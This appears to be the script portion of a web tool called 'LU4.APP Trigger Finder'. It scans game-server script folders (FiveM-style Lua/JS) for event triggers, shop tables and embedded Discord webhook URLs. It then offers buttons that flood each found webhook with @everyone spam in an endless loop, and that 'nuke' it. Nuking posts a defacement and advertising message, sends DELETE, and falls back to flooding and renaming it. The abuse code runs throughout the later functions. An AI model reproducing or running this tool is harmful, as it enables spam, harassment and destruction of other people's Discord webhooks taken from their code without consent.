            // Basic regex to find potential shop tables (adjust as needed)
            const shopTableRegex = /(\w+)\s*=\s*{\s*name\s*=\s*['"]([^'"]+)['"]/g;
            let match;

            while ((match = shopTableRegex.exec(content)) !== null) {
                const shopType = match[1];
                const shopName = match[2];
                // Placeholder for locations and items - requires more complex parsing
                shops.push({
                    type: shopType,
                    name: shopName,
                    locations: ["Parsing locations..."], // Placeholder
                    items: [{ name: "Parsing items...", price: 0 }] // Placeholder
                });
            }
             if (DEBUG_MODE && shops.length > 0) console.log(`Potentially found ${shops.length} shop tables via regex.`);
            // The original line-by-line parsing logic was removed as it was complex and potentially buggy.
            // A more robust Lua parser or refined regex would be needed for accurate shop data extraction.
            return shops; // Return potentially incomplete data
        } catch (error) {
            console.error('Error parsing shops:', error);
            return [];
        }
    }

    function findShopsFile(files) {
      // Keep original logic
      return files.find(f => {
        const path = f.webkitRelativePath.toLowerCase();
        // Add more common paths
        return path.includes('config/shops.lua') ||
               path.includes('shared/shops.lua') ||
               path.includes('data/shops.lua') ||
               path.includes('shops.lua'); // Generic fallback
      });
    }

    function displayTriggers(triggers) {
        // Ensure resultsContainer is valid
        if (!resultsContainer) {
            console.error("Results container not found!");
            return;
        }
        if (triggers.length === 0) {
            resultsContainer.innerHTML = `
                <div style="text-align: center; padding: 2rem; color: var(--text-color); opacity: 0.7;">
                    <i class="fas fa-search" style="font-size: 3em; margin-bottom: 1rem; opacity: 0.5;"></i>
                    <p style="font-size: 1.2em; margin: 0;">No triggers found matching criteria</p>
                    <p style="font-size: 0.9em; margin-top: 0.5rem; opacity: 0.8;">Try adjusting your search or filters</p>
                </div>
            `;
            return;
        }
        
        // Enhanced display with copy functionality and better styling
        resultsContainer.innerHTML = triggers.map((trigger, index) => `
            <div class="trigger" data-index="${index}">
                <div class="trigger-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                    <span style="color: var(--primary-color); font-size: 0.8em; font-weight: bold;">#${index + 1}</span>
                    <button class="copy-btn" onclick="copyTrigger('${trigger.trigger.replace(/'/g, "\\'")}', this)" 
                            style="padding: 4px 8px; font-size: 0.7em; background: var(--primary-color); border: none; border-radius: 3px; color: white; cursor: pointer;">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
                <div class="full-trigger">${trigger.trigger}</div>
                <div class="folder">Folder: ${trigger.folder}</div>
            </div>
        `).join('');
    }

    // Copy trigger function
    function copyTrigger(triggerText, button) {
        navigator.clipboard.writeText(triggerText).then(() => {
            const originalText = button.innerHTML;
            button.innerHTML = '<i class="fas fa-check"></i> Copied!';
            button.style.background = '#00cc66';
            
            setTimeout(() => {
                button.innerHTML = originalText;
                button.style.background = 'var(--primary-color)';
            }, 2000);
        }).catch(err => {
            console.error('Failed to copy: ', err);
            button.innerHTML = '<i class="fas fa-times"></i> Failed';
            button.style.background = '#ff4444';
            
            setTimeout(() => {
                button.innerHTML = '<i class="fas fa-copy"></i> Copy';
                button.style.background = 'var(--primary-color)';
            }, 2000);
        });
    }

    function extractWebhooks(content) {
      // Keep original regex
      const webhookRegex = /https:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+/g;
      return content.match(webhookRegex) || [];
    }

    function displayWebhooks(webhooks) {
      const webhooksList = document.getElementById('webhooks-list');
      const webhooksContainer = document.querySelector('.webhook-container');
      if (!webhooksList || !webhooksContainer) return;

      if (webhooks.length === 0) {
          webhooksList.innerHTML = '<p style="text-align: center; font-style: italic;">No webhooks found.</p>';
          webhooksContainer.classList.remove('visible');
          return;
      }

      // Initially hide container, will show only when working webhooks are confirmed
      webhooksContainer.classList.remove('visible');
      let workingWebhooksFound = false;

      // Keep original display logic, ensure unique IDs
      webhooksList.innerHTML = webhooks.map((webhook, index) => {
        const webhookId = `webhook-${index}-${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}`;
        return `
          <div class="webhook" data-webhook-id="${webhookId}">
            <img src="https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public"
                 alt="Webhook Avatar"
                 class="webhook-avatar">
            <div class="webhook-content">
              <div class="webhook-url">${webhook}</div>
              <div class="webhook-info">Status: <span class="webhook-status">Checking...</span></div>
              <div class="webhook-controls">
                <div style="display: flex; gap: 5px; margin-bottom: 8px; flex-wrap: wrap;">
                  <select class="mention-tag" onchange="insertMention(this)">
                    <option value="">Add Mention</option>
                    <option value="@everyone">@everyone</option>
                    <option value="@here">@here</option>
                    <option value="||@everyone||">Spoiler @everyone</option>
                    <option value="||@here||">Spoiler @here</option>
                  </select>
                  <input type="text" class="webhook-spam-input" placeholder="www.lu4.app">
                </div>
                 <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                    <button class="spam-btn" onclick="startInfiniteSpam('${webhook}', this)"><i class="fas fa-infinity"></i> Spam</button>
                    <button class="stop-btn" onclick="stopSpam('${webhook}', this)" style="display:none;"><i class="fas fa-stop-circle"></i> Stop</button>
                    <button class="delete-btn" onclick="nukeWebhook('${webhook}')"><i class="fas fa-skull-crossbones"></i> Delete</button>
                 </div>
              </div>
            </div>
          </div>
        `;
      }).join('');

      // Check status for each webhook and show container only if working webhooks found
      let checkedWebhooks = 0;
      webhooks.forEach(async (webhook, index) => {
         const webhookId = `webhook-${index}-${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}`;
         const isWorking = await checkWebhook(webhook, webhookId);
         
         if (isWorking) {
           workingWebhooksFound = true;
           webhooksContainer.classList.add('visible');
         }
         
         checkedWebhooks++;
         // If all webhooks checked and none working, ensure container stays hidden
         if (checkedWebhooks === webhooks.length && !workingWebhooksFound) {
           webhooksContainer.classList.remove('visible');
         }
      });
    }

    const spamControls = new Map(); // Keep original map

    async function startInfiniteSpam(webhook, button) {
        // Keep original logic, ensure querySelectors are correct
        const container = button.closest('.webhook-controls');
        if (!container) return;
        const spamInput = container.querySelector('.webhook-spam-input');
        const stopBtn = container.querySelector('.stop-btn');
        const spamBtn = container.querySelector('.spam-btn'); // Get spam button

        if (!spamInput || !stopBtn || !spamBtn) return;

        spamBtn.style.display = 'none'; // Hide spam button
        stopBtn.style.display = 'inline-block'; // Show stop button

        spamControls.set(webhook, true); // Mark as running

        // Add status indicator
        const statusElement = container.closest('.webhook').querySelector('.webhook-status');
        if (statusElement) {
            statusElement.textContent = '🔥 Spamming...';
            statusElement.style.color = '#ff4444';
        }

        while (spamControls.get(webhook)) { // Check flag in loop
            try {
                const content = spamInput.value || 'www.lu4.app @everyone';
                
                const response = await fetch(webhook, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                    },                    
                    body: JSON.stringify({
                        content: content,
                        username: 'Lu4 Webhook Spammer',
                        avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public'
                    })
                });

                if (DEBUG_MODE) {
                    console.log(`Spam request sent. Status: ${response.status}`);
                    if (!response.ok) {
                        const errorText = await response.text();
                        console.log(`Response error: ${errorText}`);
                    }
                }

                // Respect Discord's rate limits - wait at least 1 second between messages
                await new Promise(r => setTimeout(r, 1000 + Math.random() * 500));

            } catch (error) {
                console.error('Spam error:', error);
                if (DEBUG_MODE) console.log(`Error details:`, error);
                
                // Wait longer on error to avoid hitting rate limits
                await new Promise(r => setTimeout(r, 2000));
            }
        }

        // Reset status when stopped
        if (statusElement) {
            statusElement.textContent = '🟢 Working';
            statusElement.style.color = '#00ff00';
        }
    }

    function stopSpam(webhook, stopBtn) {
        // Keep original logic, ensure querySelectors are correct
        spamControls.set(webhook, false); // Set flag to false to stop loop
        spamControls.delete(webhook); // Clean up map entry

        const container = stopBtn.closest('.webhook-controls');
        if (!container) return;
        const spamBtn = container.querySelector('.spam-btn');
        const currentStopBtn = container.querySelector('.stop-btn'); // Ensure we target the correct stop button

        if (spamBtn) spamBtn.style.display = 'inline-block'; // Show spam button
        if (currentStopBtn) currentStopBtn.style.display = 'none'; // Hide stop button

        // Reset status
        const statusElement = container.closest('.webhook').querySelector('.webhook-status');
        if (statusElement) {
            statusElement.textContent = '🟢 Working';
            statusElement.style.color = '#00ff00';
        }
    }

    async function checkWebhook(webhook, webhookId) {
        const container = document.querySelector(`[data-webhook-id="${webhookId}"]`);
        if (!container) return false;

        const statusElement = container.querySelector('.webhook-status');
        if (!statusElement) return false;

        try {
            let response = await fetch(webhook, { method: 'HEAD' });
            if (!response.ok) {
                 response = await fetch(webhook);
            }

            const isWorking = response.ok;
            statusElement.textContent = isWorking ? '🟢 Working' : '🔴 Invalid';
            statusElement.style.color = isWorking ? '#00ff00' : '#ff0000';
            
            return isWorking; // Return whether webhook is working
        } catch (error) {
            if (DEBUG_MODE) console.warn(`Webhook check failed for ${webhookId}:`, error);
            statusElement.textContent = '❓ Error Checking';
            statusElement.style.color = '#ffa500';
            return false;
        }
    }

    async function nukeWebhook(webhook) {
        // Keep original logic, ensure querySelectors are correct
        const webhookId = `webhook-${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}`; // Reconstruct ID if not passed
        const container = document.querySelector(`[data-webhook-id^="webhook-"][data-webhook-id$="${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}"]`); // More flexible selector
        if (!container) {
             console.error("Nuke target container not found for ID ending with:", btoa(webhook).replace(/[^a-zA-Z0-9]/g, ''));
             return;
        }

        const statusElement = container.querySelector('.webhook-status');
        const controls = container.querySelector('.webhook-controls');
        if (!statusElement || !controls) return;

        statusElement.textContent = '⚠️ Nuking...';
        statusElement.style.color = '#ffa500';
        controls.style.opacity = '0.5';
        controls.style.pointerEvents = 'none';

        try {
            // Send nuke message
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: '**YOUR WEBHOOK HAS BEEN NUKED BY www.lu4.app** @everyone\nJoin us: https://discord.gg/wXPr48bDEJ',
                    username: 'Lu4 Webhook Nuker',
                    avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public',
                    allowed_mentions: { parse: ['everyone'] }
                })
            });
            await new Promise(r => setTimeout(r, 500)); // Shorter wait

            // Attempt DELETE
            const deleteResponse = await fetch(webhook, { method: 'DELETE' });

            // Check if delete was successful (204 No Content)
            if (deleteResponse.status === 204) {
                 statusElement.textContent = '💀 Nuked (Deleted)';
                 statusElement.style.color = '#ff0000';
            } else {
                 // If delete failed, try other methods (spam/patch) - less reliable
                 if (DEBUG_MODE) console.log(`Webhook delete failed with status ${deleteResponse.status}. Trying fallback methods.`);
                 // Fallback spam (less aggressive)
                 await fetch(webhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: ''.padStart(1000, 'NUKED ') })
                 });
                 await fetch(webhook, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ name: 'NUKED_BY_LU4' })
                 });
                 statusElement.textContent = '⚠️ Nuke Attempted (Delete Failed)';
                 statusElement.style.color = '#ffa500';
            }

        } catch (error) {
            statusElement.textContent = '❌ Nuke Failed';
            statusElement.style.color = '#ff0000';
            console.error('Nuke error:', error);
            controls.style.pointerEvents = 'auto';
            controls.style.opacity = '1';
        }
    }

    function insertMention(select) {
        // Keep original logic, ensure querySelectors are correct
        if (!select.value) return;
        const container = select.closest('.webhook-controls');
         if (!container) return;
        const input = container.querySelector('.webhook-spam-input');
         if (!input) return;
        // Append mention to existing text or set if empty
        input.value = input.value ? `${input.value} ${select.value}` : select.value;
        select.value = ''; // Reset select
        input.focus(); // Focus input after insertion
    }

    // ... existing functions (extractTriggers, extractShops, findShopsFile, displayTriggers, extractWebhooks, displayWebhooks, startInfiniteSpam, stopSpam, checkWebhook, nukeWebhook, insertMention) ...
    // Ensure these functions use the correct element IDs if they were changed.

    // Handle Folder Input (enhanced with better feedback)
    folderInput.addEventListener('change', async (event) => {
        const files = Array.from(event.target.files);
        progressContainer.style.display = 'block';
        progressBar.style.width = '0%';
        progressBar.textContent = '0%';
        resultsContainer.innerHTML = ''; // Clear previous results
        document.getElementById('webhooks-list').innerHTML = ''; // Clear previous webhooks
        allTriggers = [];
        allShops = [];
        let allWebhooks = new Set(); // Use Set to avoid duplicates
        let processedFiles = 0;

        // Update files count in stats
        const filesCountEl = document.getElementById('files-count');
        if (filesCountEl) filesCountEl.textContent = files.length;

        showMessage('Starting scan...', 'success', false);

        try {
            const shopsFile = findShopsFile(files);
            if (shopsFile) {
                if (DEBUG_MODE) console.log('Found shops file:', shopsFile.webkitRelativePath);
                const text = await shopsFile.text();
                allShops = extractShops(text);
                 if (DEBUG_MODE) console.log('Extracted shops:', allShops.length, allShops);
            }

            const remainingFiles = files.filter(f => f !== shopsFile);
            const totalFiles = remainingFiles.length;
            const batchSize = 15; // Optimized batch size

            for (let i = 0; i < totalFiles; i += batchSize) {
                const batch = remainingFiles.slice(i, i + batchSize);

                await Promise.all(batch.map(async file => {
                    // Process only .lua and .js files, ignore others silently
                    if (file.name.endsWith('.lua') || file.name.endsWith('.js')) {
                        try {
                            const text = await file.text();
                            const folderPath = file.webkitRelativePath.split('/').slice(0, -1).join('/');

                            const triggers = extractTriggers(text, folderPath);
                            allTriggers.push(...triggers);

                            const webhooks = extractWebhooks(text);
                            webhooks.forEach(webhook => allWebhooks.add(webhook));
                        } catch (readError) {
                            if (DEBUG_MODE) console.warn(`Could not read file: ${file.webkitRelativePath}`, readError);
                        }
                    }
                    processedFiles++;
                }));

                const progress = (processedFiles / totalFiles) * 100;
                progressBar.style.width = `${Math.min(progress, 100)}%`;
                progressBar.textContent = `${Math.round(Math.min(progress, 100))}%`;

                // Yield to the event loop to keep UI responsive
                await new Promise(resolve => setTimeout(resolve, 10));
            }
        } catch (error) {
            console.error('Processing error:', error);
            showMessage('An error occurred during processing.', 'error');
        }

        progressContainer.style.display = 'none';
        downloadButton.disabled = allTriggers.length === 0 && allShops.length === 0;
        displayTriggers(allTriggers);
        displayWebhooks(Array.from(allWebhooks));
        updateStats();

        // Enhanced summary message
        const webhookCount = allWebhooks.size;
        const summary = `Scan complete! Found ${allTriggers.length} triggers, ${webhookCount} webhooks, and ${allShops.length} shop definitions from ${processedFiles} files.`;
        showMessage(summary, 'success', false);
    });

    // Enhanced Search Functionality
    searchButton.addEventListener('click', () => {
        showLoading(true);
        
        setTimeout(() => {
            const query = searchInput.value.toLowerCase();
            const filteredTriggers = allTriggers.filter(trigger =>
                trigger.trigger.toLowerCase().includes(query) ||
                trigger.folder.toLowerCase().includes(query)
            );
            displayTriggers(filteredTriggers);
            updateStats();
            
            const message = query ? 
                `Found ${filteredTriggers.length} triggers matching "${searchInput.value}"` :
                `Showing all ${allTriggers.length} triggers`;
            showMessage(message, 'success');
            showLoading(false);
        }, 500); // Small delay to show loading
    });
    
    // Allow searching on Enter key press
    searchInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') {
            searchButton.click();
        }
    });


    // Enhanced Filter Functionality
    filters.forEach(filter => {
        filter.addEventListener('change', () => {
            const activeFilters = Array.from(filters)
                .filter(f => f.checked)
                .map(f => f.value);

            let filteredTriggers;

            if (activeFilters.length === 0) {
                filteredTriggers = allTriggers; // Show all if no filters
            } else {
                filteredTriggers = allTriggers.filter(trigger =>
                    activeFilters.some(filterKeyword => trigger.trigger.toLowerCase().includes(filterKeyword))
                );
            }
            displayTriggers(filteredTriggers);
            
            const filterText = activeFilters.length > 0 ? 
                `Filtered by: ${activeFilters.join(', ')}` : 
                'No filters active';
            showMessage(`Showing ${filteredTriggers.length} triggers. ${filterText}`, 'success');
        });
    });


    // Download Button (no changes needed if using `allTriggers` and `allShops`)
    downloadButton.addEventListener('click', () => {
      // ... (keep existing ASCII art and text generation logic) ...
            const asciiArt = `
===================================================================
                        LU4.APP TRIGGER FINDER
===================================================================
                   Find triggers and webhooks in scripts
                        www.lu4.app
                  https://discord.gg/wXPr48bDEJ
===================================================================
`;

      const triggersText = allTriggers.length > 0
        ? allTriggers.map(trigger => `Trigger: ${trigger.trigger}\nFolder: ${trigger.folder}\n--------------------------`).join('\n')
        : "No triggers found.";

      const shopsText = allShops.length > 0
        ? allShops.map(shop => {
            const uniqueLocations = [...new Set(shop.locations)];
            const locations = uniqueLocations.length > 0 ? uniqueLocations.map(loc => `    ${loc}`).join('\n') : "    No locations specified.";
            const items = shop.items.length > 0 ? shop.items.map(item => {
              const currencyText = item.currency && item.currency !== 'money' ? `, Currency: ${item.currency}` : '';
              return `    - ${item.name} (Price: ${item.price}${currencyText})`;
            }).join('\n') : "    No items specified.";

            return `Shop Definition: ${shop.type} (${shop.name || 'Unnamed'})\n\n  Locations:\n${locations}\n\n  Items:\n${items}\n--------------------------`;
          }).join('\n')
        : "No shop definitions found.";

      const fullText = `${asciiArt}\n\n--- Triggers ---\n${triggersText}\n\n--- Shops and Locations ---\n${shopsText}`;

      const blob = new Blob([fullText], { type: 'text/plain;charset=utf-8' }); // Specify charset
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'lu4_finder_results.txt'; // More descriptive filename
      document.body.appendChild(a); // Append to body for Firefox compatibility
      a.click();
      document.body.removeChild(a); // Clean up
      URL.revokeObjectURL(url);
    });

    // End of script
  </script>
</body>
</html>
